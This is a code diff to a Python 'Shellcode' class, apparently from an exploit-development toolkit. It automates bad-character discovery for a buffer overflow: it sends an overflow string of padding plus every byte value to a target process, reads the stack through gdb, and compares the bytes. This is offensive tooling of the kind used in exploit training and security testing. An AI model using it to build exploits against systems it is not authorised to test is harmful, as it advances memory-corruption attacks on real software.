@@ -1,5 +1,6 @@
 from Target.target import Target
 from Target.target_factory import create_target
+import binascii
 
 
 class Shellcode:
@@ -14,6 +15,7 @@ class Shellcode:
 
         gdb_execute = f'/usr/bin/gdb -pid={self.target.get_pid()}'
         debugger = create_target(gdb_execute)
+        chars = self.get_hex_chars()
 
         for i in range(3):
             if i == 1:
@@ -25,12 +27,37 @@ class Shellcode:
         debugger.receive_data()
         debugger.send_data("continue")
         debugger.receive_data()
-        self.target.send_data('A' * 280 + self.bad_characters)
+        self.target.send_data('A' * offset + "B" * 8 + chars)
         debugger.receive_data()
 
-        debugger.send_data("x/400xb ${register}"
+        debugger.send_data("x/264xb ${register}"
                            .format(register="rsp" if self.target.get_bit_arch() == 64 else "esp"))
-        print(debugger.receive_data())
+
+        hex_dump = debugger.receive_data() + "\n"
+        while True:
+            debugger.send_data("\n")
+            data = debugger.receive_data()
+            hex_dump += data
+            if "gdb" in data:
+                break
+
+        hex_list = hex_dump.replace("\n", " ").replace("\t", " ").split(" ")
+        comparator_list = self.get_hex_comparator_list()
+        counter = 0
+
+        for i in range(9, len(hex_list)):
+            if len(hex_list[i]) > 4:
+                continue
+            if hex_list[i] == comparator_list[counter]:
+                counter += 1
+            else:
+                bad_char = comparator_list[counter]
+                bad_char_hex = binascii.unhexlify(bad_char[2:]).decode()
+                chars = chars.replace(bad_char_hex, "")
+                self.bad_characters += bad_char_hex
+                break
+
+        print(self.bad_characters.encode())
 
     def get_hex_chars(self):
         return (
@@ -51,8 +78,12 @@ class Shellcode:
             "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
             "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
         )
-    #     hex_chars = list()
-    #     for i in range(1, 256):
-    #         hex_chars.append(i)
-    #     print(bytes(hex_chars).decode())
-    #     return bytes(hex_chars)
+
+    def get_hex_comparator_list(self):
+        hex_chars = list()
+        for i in range(1, 256):
+            if i < 16:
+                hex_chars.append(f'0x0{hex(i)[2]}')
+            else:
+                hex_chars.append(hex(i))
+        return hex_chars
